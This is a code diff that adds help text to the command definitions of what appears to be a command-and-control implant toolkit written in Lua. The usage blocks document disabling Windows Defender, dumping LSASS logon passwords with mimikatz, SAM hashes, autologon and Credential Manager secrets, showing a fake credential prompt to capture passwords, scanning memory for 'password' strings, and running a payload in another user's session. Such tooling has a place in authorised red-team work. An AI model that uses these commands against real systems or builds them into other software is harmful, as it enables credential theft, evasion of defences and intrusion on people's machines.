@@ -18,6 +18,19 @@ local cmd_screenshot = command("screenshot", run_screenshot, "Command: situation
 cmd_screenshot:Flags():String("filename","screenshot.jpg","filename to save screenshot")
 opsec("screenshot", 9.0)
 
+help("screenshot", [[
+Take a screenshot of the target's desktop.
+
+**Usage:**
+
+```
+screenshot
+screenshot --filename custom.jpg
+```
+
+> Saves screenshot as JPEG. Default filename: screenshot.jpg.
+]])
+
 -- curl
 local function run_curl(args,cmd)
     local host = cmd:Flags():GetString("host")
@@ -74,6 +87,19 @@ cmd_curl:Flags():String("header", "", "custom header")
 cmd_curl:Flags():String("body", "", "request body")
 bind_flags_completer(cmd_curl, { method = values_completer({"GET", "POST", "PUT", "PATCH", "DELETE"}) })
 
+help("curl", [[
+HTTP client tool for making requests from the implant.
+
+**Usage:**
+
+```
+curl --host example.com
+curl --host example.com --method POST --body "data" --port 8080
+```
+
+> All parameters use flags. `--host` is required.
+]])
+
 -- readfile
 local function run_readfile(args,cmd)
     local filepath = args[1]
@@ -93,6 +119,22 @@ end
 local cmd_readfile = command("readfile", run_readfile, "Read file content <filepath>", "T1005")
 cmd_readfile:Flags():String("filepath", "", "path to the file to read")
 opsec("readfile", 9.0)
+
+help("readfile", [[
+Read file content from the target using BOF.
+
+**Positional arguments format:**
+
+```
+readfile C:\Users\admin\Desktop\secret.txt
+```
+
+**Flag format:**
+
+```
+readfile --filepath C:\Users\admin\Desktop\secret.txt
+```
+]])
 
 
 -- kill_defender
@@ -118,6 +160,26 @@ local cmd_kill_defender = command("kill_defender", run_kill_defender, "Kill or c
 cmd_kill_defender:Flags():String("action", "check", "action to perform (kill or check)")
 bind_flags_completer(cmd_kill_defender, { action = values_completer({"kill", "check"}) })
 opsec("kill_defender", 9.0)
+
+help("kill_defender", [[
+Kill or check Windows Defender status.
+
+**Positional arguments format:**
+
+```
+kill_defender check
+kill_defender kill
+```
+
+**Flag format:**
+
+```
+kill_defender --action check
+kill_defender --action kill
+```
+
+> `check` queries Defender status, `kill` attempts to terminate it. Requires elevated privileges.
+]])
 
 -- dump_wifi
 local function run_dump_wifi(args, cmd)
@@ -174,6 +236,18 @@ end
 local cmd_enum_wifi = command("wifi:enum", run_enum_wifi, "Enumerate WiFi profiles", "T1016")
 opsec("wifi:enum", 9.0)
 
+help("wifi:enum", [[
+Enumerate all saved WiFi profiles on the target.
+
+**Usage:**
+
+```
+wifi enum
+```
+
+> No arguments required. Lists all saved wireless profiles.
+]])
+
 -- memoryinfo
 local function run_memoryinfo(cmd)
     local session = active()
@@ -184,6 +258,18 @@ end
 
 local cmd_memoryinfo = command("memoryinfo", run_memoryinfo, "Get system memory information", "T1082")
 opsec("memoryinfo", 9.0)
+
+help("memoryinfo", [[
+Get system memory information from the target.
+
+**Usage:**
+
+```
+memoryinfo
+```
+
+> No arguments required.
+]])
 
 -- memreader
 local function run_memreader(cmd)
@@ -213,6 +299,19 @@ cmd_memreader:Flags():String("target-pid", "", "target process ID")
 cmd_memreader:Flags():String("pattern", "", "memory pattern to search")
 cmd_memreader:Flags():String("output-size", "10", "output size limit")
 opsec("memreader", 9.0)
+
+help("memreader", [[
+Read memory from a target process by searching for a pattern.
+
+**Usage:**
+
+```
+memreader --target-pid 1234 --pattern "password"
+memreader --target-pid 1234 --pattern "secret" --output-size 20
+```
+
+> `--target-pid` and `--pattern` are required. Default output-size is 10.
+]])
 
 -- dump_sam
 local function run_dump_sam(args, cmd)
@@ -284,6 +383,19 @@ local cmd_pingscan = command("pingscan", run_pingscan, "Ping scan target <target
 cmd_pingscan:Flags():String("target", "", "IP or hostname(eg. 10.10.121.100-10.10.121.120,192.168.0.1/24)")
 opsec("pingscan", 9.0)
 
+help("pingscan", [[
+Ping scan to discover live hosts.
+
+**Usage:**
+
+```
+pingscan --target 192.168.1.0/24
+pingscan --target 10.10.121.100-10.10.121.120
+```
+
+> `--target` is required. Supports CIDR and IP ranges.
+]])
+
 -- portscan
 local function run_portscan(cmd)
     local target = cmd:Flags():GetString("target")
@@ -307,6 +419,19 @@ cmd_portscan:Flags():String("target", "", "IPv4 ranges and CIDR (eg. 192.168.1.1
 cmd_portscan:Flags():String("ports", "", "ports to scan (e.g., 80,443,8080 or 1-1000)")
 
 opsec("portscan", 9.0)
+
+help("portscan", [[
+Port scan to discover open ports on target hosts.
+
+**Usage:**
+
+```
+portscan --target 192.168.1.1 --ports 80,443,8080
+portscan --target 192.168.1.0/24 --ports 1-1000
+```
+
+> `--target` and `--ports` are required. Supports CIDR, IP ranges, and port ranges.
+]])
 
 --[[
 alias dir {
@@ -369,6 +494,26 @@ cmd_dir:Flags():String("path", "", "directory path to list")
 cmd_dir:Flags():Bool("subdirs", false, "include subdirectories (optional)")
 opsec("dir", 9.0)
 
+help("dir", [[
+List directory contents using BOF.
+
+**Positional arguments format:**
+
+```
+dir C:\Users
+dir C:\Windows\Temp
+```
+
+**Flag format:**
+
+```
+dir --path C:\Users
+dir --path C:\Users --subdirs
+```
+
+> Defaults to current working directory if no path specified. `--subdirs` includes subdirectories.
+]])
+
 -- ipconfig
 local function run_ipconfig(cmd)
     local session = active()
@@ -379,6 +524,18 @@ end
 
 local cmd_ipconfig = command("ipconfig", run_ipconfig, "Display network configuration", "T1016")
 opsec("ipconfig", 9.0)
+
+help("ipconfig", [[
+Display network adapter configuration.
+
+**Usage:**
+
+```
+ipconfig
+```
+
+> No arguments required.
+]])
 
 
 -- nslookup
@@ -494,6 +651,18 @@ end
 local cmd_systeminfo = command("systeminfo", run_systeminfo, "Display system information", "T1082")
 opsec("systeminfo", 9.0)
 
+help("systeminfo", [[
+Display detailed system information including OS version, hotfixes, locale, and hardware.
+
+**Usage:**
+
+```
+systeminfo
+```
+
+> No arguments required.
+]])
+
 -- klist
 local function run_klist(cmd)
     local action = cmd:Flags():GetString("action")
@@ -525,6 +694,20 @@ cmd_klist:Flags():String("action", "", "action to perform (get, purge, or empty 
 cmd_klist:Flags():String("spn", "", "target SPN (required for 'get' action)")
 bind_flags_completer(cmd_klist, { action = values_completer({"get", "purge"}) })
 opsec("klist", 9.0)
+
+help("klist", [[
+Interact with cached Kerberos tickets.
+
+**Usage:**
+
+```
+klist
+klist --action get --spn CIFS/dc01.domain.com
+klist --action purge
+```
+
+> No action = list all tickets. `get` requests a TGS for the specified SPN. `purge` clears all cached tickets.
+]])
 
 -- nanodump
 local function run_nanodump(cmd)
@@ -864,6 +1047,18 @@ end
 local cmd_logonpasswords = command("logonpasswords", run_logonpasswords, "Extract logon passwords using mimikatz", "T1003.001")
 opsec("logonpasswords", 5.9)
 
+help("logonpasswords", [[
+Extract logon passwords from LSASS using mimikatz (sekurlsa::logonpasswords).
+
+**Usage:**
+
+```
+logonpasswords
+```
+
+> No arguments required. Requires administrator privileges.
+]])
+
 -- hashdump
 local function run_hashdump()
     local session = active()
@@ -873,6 +1068,18 @@ local function run_hashdump()
 end
 local cmd_hashdump = command("hashdump", run_hashdump, "Dump the SAM, SECURITY and SYSTEM registries", "T1003.002")
 opsec("hashdump", 9.0)
+
+help("hashdump", [[
+Dump password hashes from the SAM, SECURITY and SYSTEM registries.
+
+**Usage:**
+
+```
+hashdump
+```
+
+> No arguments required. Requires administrator privileges.
+]])
 
 -- autologon
 local function run_autologon()
@@ -884,6 +1091,18 @@ end
 local cmd_autologon = command("autologon", run_autologon, "Dump the autologon credentials", "T1552.001")
 opsec("autologon", 9.0)
 
+help("autologon", [[
+Dump autologon credentials from the Windows registry.
+
+**Usage:**
+
+```
+autologon
+```
+
+> No arguments required.
+]])
+
 -- credman
 local function run_credman()
     local session = active()
@@ -893,6 +1112,18 @@ local function run_credman()
 end
 local cmd_credman = command("credman", run_credman, "Dump the Credential Manager credentials", "T1555.004")
 opsec("credman", 9.0)
+
+help("credman", [[
+Dump credentials stored in Windows Credential Manager.
+
+**Usage:**
+
+```
+credman
+```
+
+> No arguments required.
+]])
 
 -- askcreds
 local function run_askcreds(cmd)
@@ -910,6 +1141,20 @@ cmd_askcreds:Flags():String("prompt", "Restore Network Connection", "prompt to d
 cmd_askcreds:Flags():String("note", "Please verify your Windows user credentials to proceed", "note to display")
 cmd_askcreds:Flags():Int("wait_time", 30, "password to dump credentials for")
 opsec("askcreds", 9.0)
+
+help("askcreds", [[
+Display a fake credential prompt to the user and capture entered credentials.
+
+**Usage:**
+
+```
+askcreds
+askcreds --prompt "Windows Security" --note "Please verify your credentials"
+askcreds --wait_time 60
+```
+
+> Displays a dialog box. Default wait time is 30 seconds.
+]])
 
 -- ldapsearch
 local function run_ldapsearch(args, cmd)
@@ -1044,6 +1289,18 @@ end
 local cmd_execute_cross_session = command("execute_cross_session", run_execute_cross_session, "Execute a binary on disk within the context of another logged-on user's session", "T1134")
 cmd_execute_cross_session:Flags():Int("session_id", 0, "the session ID of the user in which context the specified binary needs to be executed.")
 cmd_execute_cross_session:Flags():String("binary_path", "", "path to the binary that you like to execute")
+
+help("execute_cross_session", [[
+Execute a binary on disk within the context of another logged-on user's session.
+
+**Usage:**
+
+```
+execute_cross_session --session_id 2 --binary_path "C:\Windows\Temp\payload.exe"
+```
+
+> Both `--session_id` and `--binary_path` are required.
+]])
 
 -- Manual inject into specific PID
 local function run_rdpthief_inject(args, cmd)
